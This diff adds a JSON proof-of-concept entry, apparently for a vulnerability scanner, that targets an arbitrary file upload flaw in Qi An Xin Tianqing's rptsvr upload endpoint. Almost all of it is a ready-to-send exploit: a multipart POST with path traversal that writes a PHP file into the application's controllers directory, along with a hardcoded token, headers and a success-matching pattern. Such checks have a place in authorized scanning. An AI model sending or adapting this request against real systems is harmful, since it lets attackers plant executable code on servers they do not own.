@@ -1,0 +1,21 @@
+{
+	"name":"奇安信天擎rptsvr任意文件上传",
+	"tag":"qianxin",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/rptsvr/upload",
+		"pocPost":"-----------------------------55433477442814818502792421460\r\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"../../../application/api/controllers/TController2.php\"\r\nContent-Type: text/x-python\r\n\r\n<?php\r\nphpinfo();\r\n?>\r\n-----------------------------55433477442814818502792421460\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\nskylar_report\r\n-----------------------------55433477442814818502792421460",
+		"header":{
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+			"Upgrade-Insecure-Requests":" 1",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Accept-Language":" en-US,en;q=0.5",
+			"Content-Length":" 414",
+			"Content-Type":" multipart/form-data;boundary=---------------------------55433477442814818502792421460"
+		},
+		"status_code":"200",
+		"pattern":"(uploaded)"
+	}
+}
